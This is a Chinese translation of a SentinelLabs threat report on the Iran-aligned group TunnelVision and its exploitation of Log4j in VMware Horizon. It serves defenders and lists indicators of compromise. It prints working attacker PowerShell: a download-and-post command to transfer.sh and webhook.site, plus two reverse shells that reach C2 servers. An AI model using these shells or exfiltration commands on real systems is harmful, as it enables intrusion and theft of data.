**译者：知道创宇404实验室翻译组  
原文链接：**
## 摘要
  * SentinelLabs 一直在追踪一个与伊朗结盟的攻击者，他们在中东和美国活动。
  * 由于攻击者对隧道工具的严重依赖，以及它选择广泛部署这些工具的独特方式，我们把这个攻击组织称为 TunnelVision。
  * 就像最近在该地区活动的其他伊朗黑客一样，TunnelVision 的活动与部署勒索软件有关，因而他们算是潜在的破坏性的攻击者。
## 概览
TunnelVision 攻击特点在于广泛利用目标地区的1-day漏洞。在我们跟踪这个攻击者的过程中，我们观察到了针对 Fortinet FortiOS
(CVE-2018-13379)、 Microsoft Exchange (ProxyShell)和最近的 Log4Shell
的广泛利用。在几乎所有这些案例中，攻击者都以一种独特的方式部署了一个隧道工具。该组织使用的最常用的部署隧道工具是快速反向代理客户机(FRPC)和
Plink。
TunnelVision 的攻击在某种程度上与黑客组织 **Phosphorus** 有关，这一点在归因部分有进一步的讨论。
在这篇文章中，我们重点介绍了我们最近从 TunnelVision 操作者那里观察到的一些活动，这些活动主要围绕利用 VMware Horizon Log4j
漏洞展开。
## VMware Horizon 利用
VMware Horizon中对Log4j的利用的特点是，VMware产品的Tomcat服务(`C:\Program Files\VMware\VMware
View\Server\bin\ws_TomcatService.exe`)产生了一个恶意进程。
TunnelVision 攻击者一直在积极地利用该漏洞来运行恶意的 PowerShell 命令、部署后门、创建后门用户、获取凭证和执行横向移动。
通常，黑客最初利用 Log4j 漏洞直接运行 PowerShell 命令，然后通过 PS 反向 shell 运行更多命令，通过 Tomcat 进程执行。
## PowerShell 命令
TunnelVision 操作者利用 VMware Horizon 中的 Log4j 漏洞来运行 PowerShell 命令，通过 webhook
将输出发送回来。在这个例子中，攻击者试图将[ngrok](https://ngrok.com/)下载到一个被感染的 VMware Horizon 服务器:
    try{
        (New-Object System.Net.WebClient).DownloadFile("hxxp://transfer.sh/uSeOFn/ngrok.exe","C:\\Users\Public\public.exe");
        Rename-Item 'c://Users//public//new.txt' 'microsoft.exe';
        $a=iex 'dir "c://Users//public//"' | Out-String;
        iwr -method post -body $a https://webhook.site/{RANDOM-GUID} -UseBasicParsing;
    }catch{
        iwr -method post -body $Error[0] https://webhook.site/{RANDOM-GUID} -UseBasicParsing;
    }
在整个活动中，我们观察到多个合法服务。如果一个环境被 TunnelVision 破坏了，那么寻找这些合法公共服务的出站连接可能会有所帮助:
  * transfer.sh
  * pastebin.com
  * webhook.site
  * ufile.io
  * raw.githubusercontent.com
## 反弹 Shell # 1
    $c = ""
    $p = ""
    $r = ""
    $u = "hxxps://www.microsoft-updateserver.cf/gadfTs55sghsSSS"
    $wc = New-Object System.Net.WebClient
    $li = (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0];
    $c = "whoami"
    $c = 'Write-Host " ";'+$c
    $r = &(gcm *ke-e*) $c | Out-String > "c:\programdata\$env:COMPUTERNAME-$li"
    $ur = $wc.UploadFile("$u/phppost.php" , "c:\programdata\$env:COMPUTERNAME-$li")
    while($true)
    {
        $c = $wc.DownloadString("$u/$env:COMPUTERNAME-$li/123.txt")
        $c = 'Write-Host " ";'+$c
        if($c -ne $p)
        {
            $r = &(gcm *ke-e*) $c | Out-String > "c:\programdata\$env:COMPUTERNAME-$li"
            $p = $c
            $ur = $wc.UploadFile("$u/phppost.php" , "c:\programdata\$env:COMPUTERNAME-$li")
        }
        sleep 3
    }
反向Shell
#1在过去被TunnelVision操作者使用(7feb4d36a33f43d7a1bb254e425ccd458d3ea921)，利用了不同的C2服务器:“hxxp://google.onedriver-srv.ml/gadfTs55sghsSSS”。这个C2在分析TunnelVision活动的几篇[文章](https://news.sophos.com/en-us/2021/11/18/new-ransomware-actor-uses-password-protected-archives-to-bypass-encryption-protection/)中被引用。
在整个活动中，攻击者利用了另一个域，`service-management[.]tk`， 用来存放恶意的有效载荷。根据 VirusTotal
的说法，这个域还用于托管一个包含自定义后门(624278ed3019a42131a3a3f6e0e2a8c8b438)的 zip
文件(d28e07d2722f771bd31c9ff90b9c64d4a188435a)。
后门植入一个额外的可执行文件(e76e9237c49e7598f2b3f94a2b52b01002f8e862)到
`%ProgramData%\Installed Packages\InteropServices.exe` 并将其注册为名为“
InteropServices”的服务。
植入的可执行文件包含上面描述的反向 shell 的模糊版本，向同一个 c2服务器(`www[.]microsoft-updateserver[.]cf`)发出信号。尽管它没有加密，但是它被去模糊化，并且以某种类似于 PowerLess
(该组使用的另一个[后门](https://www.cybereason.com/blog/powerless-trojan-iranian-apt-phosphorus-adds-new-powershell-backdoor-for-espionage))执行其 PowerShell
有效负载的方式执行。
## 反向 Shell # 2
    $hst = "51.89.135.142";
    $prt = 443;
    function watcher() {;
        $limit = (Get - Random  - Minimum 3  - Maximum 7);
        $stopWatch = New - Object  - TypeName System.Diagnostics.Stopwatch;
        $timeSpan = New - TimeSpan  - Seconds $limit;
        $stopWatch.Start();
        while ((($stopWatch.Elapsed).TotalSeconds  - lt $timeSpan.TotalSeconds) )  {};
        $stopWatch.Stop();
    };
    watcher;
    $arr = New - Object int[] 500;
    for ($i = 0;
    $i  - lt 99;
    $i++) {;
        $arr[$i] = (Get - Random  - Minimum 1  - Maximum 25);
    };
    if ($arr[0]  - gt 0)  {;
        $valksdhfg = New - Object System.Net.Sockets.TCPClient($hst, $prt);
        $banljsdfn = $valksdhfg.GetStream();
        [byte[]]$bytes = 0..65535|% {
            0
        };
        while (($i = $banljsdfn.Read($bytes, 0, $bytes.Length))  - ne 0)  {;
            $lkjnsdffaa = (New - Object  - TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
            $nsdfgsahjxx = (&(gcm('*ke-exp*')) $lkjnsdffaa 2 > &1 | Out - String );
            $nsdfgsahjxx2 = $nsdfgsahjxx  +  (pwd).Path  +  "> ";
            $sendbyte = ([text.encoding]::ASCII).GetBytes($nsdfgsahjxx2);
            $banljsdfn.Write($sendbyte, 0, $sendbyte.Length);
            $banljsdfn.Flush();
            watcher
        };
        $valksdhfg.Close();
    };
我们观察到的大多数“在线”活动都是通过 PowerShell
后门执行的。它似乎是[公开](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)的 PowerShell 一行程序的一个修改版本。
这些活动包括:
  * 执行侦察命令
  * 创建后门用户并将其添加到管理员组
  * 使用 Procdump、 SAM 蜂窝转储和 comsvcs MiniDump 获取凭证
  * 下载和执行隧道工具，包括 Plink 和 Ngrok，用于隧道 RDP 通信
  * 利用 VMware Horizon NodeJS component component [[1](http://https://www.sprocketsecurity.com/blog/crossing-the-log4j-horizon-a-vulnerability-with-no-return "1"),[2](http://https://www.rapid7.com/blog/post/2022/01/18/active-exploitation-of-vmware-horizon-servers/ "2")]执行一个反向 shell。
  * 内部子网RDP扫描使用一个[公开可用](http://https://github.com/InfosecMatter/Minimalistic-offensive-security-tools/blob/master/port-scan-tcp.ps1 "公开可用")的端口扫描脚本
在整个活动中，攻击者使用了一个名为“protections20”的帐户的github存储库“VmWareHorizon”。
## 归因
TunnelVision 的活动之前已经讨论过，有很多供应商对其进行跟踪署名，比如 Phosphorus (微软) ，以及令人困惑的是，竟然还有
Charming Kitten 或 Nemesis Kitten(CrowdStrike)。
这种疑惑是因为微软认为Phosphorous是一个单一的组织，但它与 CrowdStrike 区分为两个的攻击者—— Charming Kitten
和Nemesis Kitten的活动重叠。
我们以“ TunnelVision”的名称分别跟踪这个黑客组织。这并不意味着我们认为它们与上述组织无关，只是目前没有足够的数据将它们视为与上述任何一个组织。
## IoCs
**TYPE** | **INDICATOR** | **NOTES**  
---|---|---  
Domain | www[.]microsoft-updateserver[.]cf | Command and Control (C2) Server  
Domain | www[.]service-management[.]tk | Payload server  
IP |
51.89.169[.]198（[ZoomEye搜索结果](http://https://www.zoomeye.org/searchResult?q=51.89.169%5B.%5D198
"ZoomEye搜索结果")） | Command and Control (C2) Server  
IP |
142.44.251[.]77（[ZoomEye搜索结果](http://https://www.zoomeye.org/searchResult?q=142.44.251%5B.%5D77
"ZoomEye搜索结果")） | Command and Control (C2) Server  
IP |
51.89.135[.]142（[ZoomEye搜索结果](http://https://www.zoomeye.org/searchResult?q=51.89.135%5B.%5D142
"ZoomEye搜索结果")） | Command and Control (C2) Server  
IP |
51.89.190[.]128（[ZoomEye搜索结果](http://https://www.zoomeye.org/searchResult?q=51.89.190%5B.%5D128
"ZoomEye搜索结果")） | Command and Control (C2) Server  
IP |
51.89.178[.]210（[ZoomEye搜索结果](http://https://www.zoomeye.org/searchResult?q=51.89.178%5B.%5D210
"ZoomEye搜索结果")） | Command and Control (C2) Server, Tunneling Server  
IP |
142.44.135[.]86（[ZoomEye搜索结果](http://https://www.zoomeye.org/searchResult?q=142.44.135%5B.%5D86
"ZoomEye搜索结果")） | Tunneling Server  
IP |
182.54.217[.]2（[ZoomEye搜索结果](http://https://www.zoomeye.org/searchResult?q=182.54.217%5B.%5D2
"ZoomEye搜索结果")） | Payload Server  
Github Account | https://github.com/protections20 | Account utilized to host
payloads  
* * *